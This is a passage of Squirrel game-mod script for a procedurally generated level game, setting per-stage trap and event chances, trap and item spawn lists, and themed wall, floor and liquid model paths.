			::THEMES[i].trapspawn_chance		=	30.00;
		}}},
	{function Run(){//stage 1:
		::Z_ITEMS_IN_SPAWN = 2;
			//::ITEM_ENSURE_HEAL_ORB = 1;	//V1_9 forces this to 9999 by default
		::EVENT_COOLDOWN_MIN = 0;
		::EVENT_COOLDOWN_MAX = 5;
		::EVENT_CHANCE_BASE = 15.00;
		::EVENT_CHANCE_FAIL_ADD = 5.00;
		foreach(i,t in ::THEMES){
			::THEMES[i].generichold_opentime	=	2.00;
			::THEMES[i].hold_opentime			=	0.00;
			::THEMES[i].endbutton_time			=	5.00;
			::THEMES[i].endtile_time			=	5.00;
			::THEMES[i].breakable_health		=	0.5;
			::THEMES[i].hazliquid_damage		=	4;
			::THEMES[i].trapfloor_chance		=	20.00;
			::THEMES[i].trapstep_chance			=	20.00;
			::THEMES[i].trapvicinity_chance		=	20.00;
			::THEMES[i].trapspawn_chance		=	20.00;
		}}},
	{function Run(){//stage 2:
		::Z_ITEMS_IN_SPAWN = 3;
			//::ITEM_ENSURE_HEAL_ORB = 1;	//V1_9 forces this to 9999 by default
		::EVENT_COOLDOWN_MIN = 0;
		::EVENT_COOLDOWN_MAX = 4;
		::EVENT_CHANCE_BASE = 20.00;
		::EVENT_CHANCE_FAIL_ADD = 5.00;
		foreach(i,t in ::THEMES){
			::THEMES[i].generichold_opentime	=	4.00;
			::THEMES[i].hold_opentime			=	2.00;
			::THEMES[i].endbutton_time			=	8.00;
			::THEMES[i].endtile_time			=	8.00;
			::THEMES[i].breakable_health		=	0.75;
			::THEMES[i].hazliquid_damage		=	9;
			::THEMES[i].trapfloor_chance		=	40.00;
			::THEMES[i].trapstep_chance			=	40.00;
			::THEMES[i].trapvicinity_chance		=	40.00;
			::THEMES[i].trapspawn_chance		=	40.00;
		}}},
	{function Run(){//stage 3:
		::Z_ITEMS_IN_SPAWN = 4;
			//::ITEM_ENSURE_HEAL_ORB = 1;	//V1_9 forces this to 9999 by default
		::EVENT_COOLDOWN_MIN = 0;
		::EVENT_COOLDOWN_MAX = 3;
		::EVENT_CHANCE_BASE = 25.00;
		::EVENT_CHANCE_FAIL_ADD = 5.00;
		foreach(i,t in ::THEMES){
			::THEMES[i].generichold_opentime	=	6.00;
			::THEMES[i].hold_opentime			=	4.00;
			::THEMES[i].endbutton_time			=	10.00;
			::THEMES[i].endtile_time			=	10.00;
			::THEMES[i].breakable_health		=	1.0;
			::THEMES[i].hazliquid_damage		=	14;
			::THEMES[i].trapfloor_chance		=	60.00;
			::THEMES[i].trapstep_chance			=	60.00;
			::THEMES[i].trapvicinity_chance		=	60.00;
			::THEMES[i].trapspawn_chance		=	60.00;
		}}},
	{function Run(){//stage 4:
		::Z_ITEMS_IN_SPAWN = 5;
			//::ITEM_ENSURE_HEAL_ORB = 1;	//V1_9 forces this to 9999 by default
		::EVENT_COOLDOWN_MIN = 0;
		::EVENT_COOLDOWN_MAX = 3;
		::EVENT_CHANCE_BASE = 30.00;
		::EVENT_CHANCE_FAIL_ADD = 10.00;
		foreach(i,t in ::THEMES){
			::THEMES[i].generichold_opentime	=	8.00;
			::THEMES[i].hold_opentime			=	6.00;
			::THEMES[i].endbutton_time			=	15.00;
			::THEMES[i].endtile_time			=	15.00;
			::THEMES[i].breakable_health		=	1.5;
			::THEMES[i].hazliquid_damage		=	19;
			::THEMES[i].trapfloor_chance		=	80.00;
			::THEMES[i].trapstep_chance			=	80.00;
			::THEMES[i].trapvicinity_chance		=	80.00;
			::THEMES[i].trapspawn_chance		=	80.00;
		}}},
];

global_traps_step <- [
					{template={function Spawn(pos){::TRAPS.landmine.Spawn(pos+Vector(RandomInt(-32,32),RandomInt(-32,32),0));}},			cost=2},
					{template={function Spawn(pos){::TRAPS.beartrap.Spawn(pos+Vector(RandomInt(-20,20),RandomInt(-20,20),0));}},			cost=2},
					{template={function Spawn(pos){::TRAPS.pizza.Spawn(pos+Vector(RandomInt(-18,18),RandomInt(-18,18),3));}},				cost=2},
					{template={function Spawn(pos){::TRAPS.chatter_curse.Spawn(pos+Vector(RandomInt(-18,18),RandomInt(-18,18),0));}},		cost=2},
					{template={function Spawn(pos){::TRAPS.spikes.Spawn(pos);}},															cost=2},
					{template={function Spawn(pos){::TRAPS.banana.Spawn(pos+Vector(RandomInt(-40,40),RandomInt(-40,40),0));}},				cost=2},
	];
global_traps_vicinity <- [
					{template={function Spawn(pos){::TRAPS.bomb.Spawn(pos+Vector(RandomInt(-20,20),RandomInt(-20,20),0));}},				cost=2},
					{template={function Spawn(pos){::TRAPS.guster.Spawn(pos+Vector(RandomInt(-20,20),RandomInt(-20,20),0));}},				cost=2},
					{template={function Spawn(pos){::TRAPS.flinger.Spawn(pos+Vector(RandomInt(-20,20),RandomInt(-20,20),0));}},				cost=2},
					{template={function Spawn(pos){::TRAPS.blackhole.Spawn(pos+Vector(RandomInt(-20,20),RandomInt(-20,20),40));}},			cost=7},
	];
global_traps_spawn <- [
					{template={function Spawn(pos){::TRAPS.mimic.Spawn(pos,Vector());}},													cost=10},
					{template={function Spawn(pos){::TRAPS.explosive_barrel.Spawn(pos+Vector(RandomInt(-10,10),RandomInt(-10,10),0));}},	cost=1},
					{template={function Spawn(pos){::TRAPS.buttonmimic.Spawn(pos);}},														cost=1},
					{template={function Spawn(pos){::TRAPS.slotmachine.Spawn(pos,Vector());}},												cost=3},
					{template={function Spawn(pos){::TRAPS.thigh_spider.Spawn(pos+Vector(RandomInt(-30,30),RandomInt(-30,30),1));}},		cost=2},
					{template={function Spawn(pos){::TRAPS.kart.Spawn(pos+Vector(0,0,20),Vector(0,RandomInt(0,360),0));}},					cost=1},
	];
global_items_h <- [{template={function Spawn(pos){::ITEMS.heal_orb.Spawn(pos+Vector(0,0,40));}},cost=3},	//<heal_orb must be index 0 to ensure stability
		{template={function Spawn(pos){::ITEMS.piggyback.Spawn(pos+Vector(0,0,40));}},					cost=3},
			{template={function Spawn(pos){::ITEMS.hackerman.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.rift.Spawn(pos+Vector(0,0,40),true);}},					cost=3},
		{template={function Spawn(pos){::ITEMS.rift.Spawn(pos+Vector(0,0,40),true);}},					cost=3},
			{template={function Spawn(pos){::ITEMS.storm_blade.Spawn(pos+Vector(0,0,40));}},				cost=3},
		{template={function Spawn(pos){::ITEMS.dragonslayer.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.moonboost.Spawn(pos+Vector(0,0,40));}},					cost=2},
		{template={function Spawn(pos){::ITEMS.bhop_steroids.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.planetcrystal.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.planetcrystal.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.planetcrystal.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.planetcrystal.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.planetcrystal.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.planetcrystal.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.planetcrystal.Spawn(pos+Vector(0,0,40));}},				cost=3},
		{template={function Spawn(pos){::ITEMS.claymore.Spawn(pos+Vector(0,0,40));}},				cost=3},
		{template={function Spawn(pos){::ITEMS.claymore.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.baguette.Spawn(pos+Vector(0,0,40));}},					cost=3},
			{template={function Spawn(pos){::ITEMS.baguette.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.peanutbutter.Spawn(pos+Vector(0,0,40));}},				cost=3},
		{template={function Spawn(pos){::ITEMS.peanutbutter.Spawn(pos+Vector(0,0,40));}},				cost=3},
			{template={function Spawn(pos){::ITEMS.billnye.Spawn(pos+Vector(0,0,40));}},					cost=3},
	];
global_items_z <- [
		{template={function Spawn(pos){::ITEMS.destructo_hammer.Spawn(pos+Vector(0,0,40));}},		cost=3},
		{template={function Spawn(pos){::ITEMS.impostor.Spawn(pos+Vector(0,0,40));}},				cost=3},	//IMPOSTOR_DISABLED_V1_3 > RE_ENABLED_IN_V1_6
		{template={function Spawn(pos){::ITEMS.stone.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.fling.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.puller.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.gust.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.pizzabaker.Spawn(pos+Vector(0,0,40));}},				cost=3},
		{template={function Spawn(pos){::ITEMS.flight.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.poise.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.roar.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.bomb_chuck.Spawn(pos+Vector(0,0,40));}},				cost=3},
		{template={function Spawn(pos){::ITEMS.squid.Spawn(pos+Vector(0,0,40));}},					cost=3},
		{template={function Spawn(pos){::ITEMS.greasy_fingers.Spawn(pos+Vector(0,0,40));}},			cost=3},
		{template={function Spawn(pos){::ITEMS.rift.Spawn(pos+Vector(0,0,40),false);}},				cost=3},
	];

//the "generic" theme is default (will fall back to this if desired theme does not exist for the type)
::TILEVARIANTS <- {
	WALL				={
							generic={main=[
								"models/luffaren/collective_wall.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_wallcastle.mdl",
								"models/luffaren/collective_wallcastle1.mdl",
								"models/luffaren/collective_wallcastle2.mdl",
								"models/luffaren/collective_wallcastle3.mdl",
								"models/luffaren/collective_wallcastle4.mdl",
								"models/luffaren/collective_wallcastle5.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_wallfactory.mdl",
								"models/luffaren/collective_wallfactory1.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_walltemple.mdl",
								"models/luffaren/collective_walltemple1.mdl",
								"models/luffaren/collective_walltemple2.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_wallnature.mdl",
								"models/luffaren/collective_wall1nature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_wallhell.mdl",
								"models/luffaren/collective_wall1hell.mdl",
								"models/luffaren/collective_wall2hell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_wallfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_wallsilenthill.mdl",
								"models/luffaren/collective_wallsilenthill1.mdl",
								"models/luffaren/collective_wallsilenthill1.mdl",
								"models/luffaren/collective_wallsilenthill2.mdl",
							]},
						},
	START_END			={//replicates surrounding floor/platform/floorceiling tile, no need to add anything extra for 'main'
							generic={main=["models/luffaren/collective_platform.mdl",]},
							castle={main=["models/luffaren/collective_platformcastle.mdl",]},
							factory={main=["models/luffaren/collective_platformfactory.mdl",]},
							temple={main=["models/luffaren/collective_platformtemple.mdl",]},
							nature={main=["models/luffaren/collective_platformnature.mdl",]},
							hell={main=["models/luffaren/collective_platformhell.mdl",]},
							frost={main=["models/luffaren/collective_platformfrost.mdl",]},
							silenthill={main=["models/luffaren/collective_platformsilenthill.mdl",]},
						},
	LADDER				={
							generic={main=[
								"models/luffaren/collective_ladder.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_laddercastle.mdl",
								//"models/luffaren/collective_laddercastle1.mdl",	//kinda hard to see...
							]},
							factory={main=[
								"models/luffaren/collective_ladderfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_laddertemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_laddernature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_ladderhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_ladderfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_laddersilenthill.mdl",
							]},
						},
	CLIMB				={
							generic={main=[
								"models/luffaren/collective_climb.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_climbcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_climbfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_climbtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_climbnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_climbhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_climbfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_climbsilenthill.mdl",
							]},
						},
	CLIMBHARD			={
							generic={main=[
								"models/luffaren/collective_climbhard.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_climbhardcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_climbhardfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_climbhardtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_climbhardnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_climbhardhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_climbhardfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_climbhardsilenthill.mdl",
							]},
						},
	FLOOR				={
							generic={main=[
								"models/luffaren/collective_floor.mdl",
							],slope=[
								"models/luffaren/collective_floor_slope.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalf.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_floorcastle.mdl",
								"models/luffaren/collective_floorcastle1.mdl",
							],slope=[
								"models/luffaren/collective_floor_slopecastle.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalfcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_floorfactory.mdl",
							],slope=[
								"models/luffaren/collective_floor_slopefactory.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalffactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_floortemple.mdl",
								"models/luffaren/collective_floortemple.mdl",
								"models/luffaren/collective_floortemple.mdl",
								"models/luffaren/collective_floortemple1.mdl",
							],slope=[
								"models/luffaren/collective_floor_slopetemple.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalftemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_floornature.mdl",
								"models/luffaren/collective_floor1nature.mdl",
								"models/luffaren/collective_floor2nature.mdl",
								"models/luffaren/collective_floor3nature.mdl",
							],slope=[
								"models/luffaren/collective_floor_slopenature.mdl",
								"models/luffaren/collective_floor_slope1nature.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalfnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_floorhell.mdl",
							],slope=[
								"models/luffaren/collective_floor_slopehell.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalfhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_floorfrost.mdl",
							],slope=[
								"models/luffaren/collective_floor_slopefrost.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalffrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_floorsilenthill.mdl",
							],slope=[
								"models/luffaren/collective_floor_slopesilenthill.mdl",
							],slopehalf=[
								"models/luffaren/collective_floor_slopehalfsilenthill.mdl",
							]},
						},
	PLATFORM			={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							],slope=[
								"models/luffaren/collective_platform_slope.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalf.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
								"models/luffaren/collective_platformcastle1.mdl",
								"models/luffaren/collective_platformcastle2.mdl",
								"models/luffaren/collective_platformcastle3.mdl",
							],slope=[
								"models/luffaren/collective_platform_slopecastle.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalfcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							],slope=[
								"models/luffaren/collective_platform_slopefactory.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalffactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
								"models/luffaren/collective_platformtemple.mdl",
								"models/luffaren/collective_platformtemple.mdl",
								"models/luffaren/collective_platformtemple1.mdl",
							],slope=[
								"models/luffaren/collective_platform_slopetemple.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalftemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
								"models/luffaren/collective_platform1nature.mdl",
								"models/luffaren/collective_platform2nature.mdl",
								"models/luffaren/collective_platform3nature.mdl",
							],slope=[
								"models/luffaren/collective_platform_slopenature.mdl",
								"models/luffaren/collective_platform_slope1nature.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalfnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							],slope=[
								"models/luffaren/collective_platform_slopehell.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalfhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
								"models/luffaren/collective_platformfrost.mdl",
								"models/luffaren/collective_platformfrost.mdl",
								"models/luffaren/collective_platformfrost.mdl",
								"models/luffaren/collective_platformfrost.mdl",
								"models/luffaren/collective_platformfrost2.mdl",
								"models/luffaren/collective_platformfrost3.mdl",
							],slope=[
								"models/luffaren/collective_platform_slopefrost.mdl",
								"models/luffaren/collective_platform_slopefrost.mdl",
								"models/luffaren/collective_platform_slopefrost.mdl",
								"models/luffaren/collective_platform_slopefrost2.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalffrost.mdl",
								"models/luffaren/collective_platform_slopehalffrost.mdl",
								"models/luffaren/collective_platform_slopehalffrost.mdl",
								"models/luffaren/collective_platform_slopehalffrost2.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							],slope=[
								"models/luffaren/collective_platform_slopesilenthill.mdl",
							],slopehalf=[
								"models/luffaren/collective_platform_slopehalfsilenthill.mdl",
							]},
						},
	PLATFORM_BRIDGE		={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	FLOORCEILING		={
							generic={main=[
								"models/luffaren/collective_floorceiling.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slope.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalf.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_floorceilingcastle.mdl",
								"models/luffaren/collective_floorceilingcastle1.mdl",
								"models/luffaren/collective_floorceilingcastle2.mdl",
								"models/luffaren/collective_floorceilingcastle3.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slopecastle.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalfcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_floorceilingfactory.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slopefactory.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalffactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_floorceilingtemple.mdl",
								"models/luffaren/collective_floorceilingtemple.mdl",
								"models/luffaren/collective_floorceilingtemple.mdl",
								"models/luffaren/collective_floorceilingtemple1.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slopetemple.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalftemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_floorceilingnature.mdl",
								"models/luffaren/collective_floorceiling1nature.mdl",
								"models/luffaren/collective_floorceiling2nature.mdl",
								"models/luffaren/collective_floorceiling3nature.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slopenature.mdl",
								"models/luffaren/collective_floorceiling_slope1nature.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalfnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_floorceilinghell.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slopehell.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalfhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_floorceilingfrost.mdl",
								"models/luffaren/collective_floorceilingfrost.mdl",
								"models/luffaren/collective_floorceilingfrost.mdl",
								"models/luffaren/collective_floorceilingfrost2.mdl",
								"models/luffaren/collective_floorceilingfrost3.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slopefrost.mdl",
								"models/luffaren/collective_floorceiling_slopefrost.mdl",
								"models/luffaren/collective_floorceiling_slopefrost2.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalffrost.mdl",
								"models/luffaren/collective_floorceiling_slopehalffrost.mdl",
								"models/luffaren/collective_floorceiling_slopehalffrost2.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_floorceilingsilenthill.mdl",
							],slope=[
								"models/luffaren/collective_floorceiling_slopesilenthill.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceiling_slopehalfsilenthill.mdl",
							]},
						},
	FLOORCEILINGTALL	={
							generic={main=[
								"models/luffaren/collective_floorceilingtall.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slope.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalf.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_floorceilingtallcastle.mdl",
								"models/luffaren/collective_floorceilingtallcastle1.mdl",
								"models/luffaren/collective_floorceilingtallcastle2.mdl",
								"models/luffaren/collective_floorceilingtallcastle3.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slopecastle.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalfcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_floorceilingtallfactory.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slopefactory.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalffactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_floorceilingtalltemple.mdl",
								"models/luffaren/collective_floorceilingtalltemple.mdl",
								"models/luffaren/collective_floorceilingtalltemple.mdl",
								"models/luffaren/collective_floorceilingtalltemple1.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slopetemple.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalftemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_floorceilingtallnature.mdl",
								"models/luffaren/collective_floorceilingtall1nature.mdl",
								"models/luffaren/collective_floorceilingtall2nature.mdl",
								"models/luffaren/collective_floorceilingtall3nature.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slopenature.mdl",
								"models/luffaren/collective_floorceilingtall_slope1nature.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalfnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_floorceilingtallhell.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slopehell.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalfhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_floorceilingtallfrost.mdl",
								"models/luffaren/collective_floorceilingtallfrost.mdl",
								"models/luffaren/collective_floorceilingtallfrost.mdl",
								"models/luffaren/collective_floorceilingtallfrost2.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slopefrost.mdl",
								"models/luffaren/collective_floorceilingtall_slopefrost.mdl",
								"models/luffaren/collective_floorceilingtall_slopefrost2.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalffrost.mdl",
								"models/luffaren/collective_floorceilingtall_slopehalffrost.mdl",
								"models/luffaren/collective_floorceilingtall_slopehalffrost2.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_floorceilingtallsilenthill.mdl",
							],slope=[
								"models/luffaren/collective_floorceilingtall_slopesilenthill.mdl",
							],slopehalf=[
								"models/luffaren/collective_floorceilingtall_slopehalfsilenthill.mdl",
							]},
						},
	LIQUID				={
							generic={main=["models/luffaren/collective_liquid.mdl"]},
							castle={main=["models/luffaren/collective_liquidcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquidfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquidtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquidnature.mdl"]},
							hell={main=["models/luffaren/collective_liquidhell.mdl"]},
							frost={main=["models/luffaren/collective_liquidfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquidsilenthill.mdl"]},
						},
	LIQUID_TUNNEL		={
							generic={main=["models/luffaren/collective_liquid_tunnel.mdl"]},
							castle={main=["models/luffaren/collective_liquid_tunnelcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_tunnelfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_tunneltemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_tunnelnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_tunnelhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_tunnelfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_tunnelsilenthill.mdl"]},
						},
	LIQUID_TUNNELWALL		={
							generic={main=["models/luffaren/collective_liquid_tunnel.mdl"],tunnelwallblock=["models/luffaren/collective_blockwall.mdl"]},
							castle={main=["models/luffaren/collective_liquid_tunnelcastle.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_tunnelfactory.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_tunneltemple.mdl"],tunnelwallblock=["models/luffaren/collective_blockwalltemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_tunnelnature.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_tunnelhell.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_tunnelfrost.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_tunnelsilenthill.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallsilenthill.mdl"]},
						},
	LIQUID_STREAM		={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	LIQUID_STREAM_L		={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	LIQUID_STREAM_R		={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	LIQUID_STREAM_U		={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	LIQUID_STREAM_D		={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
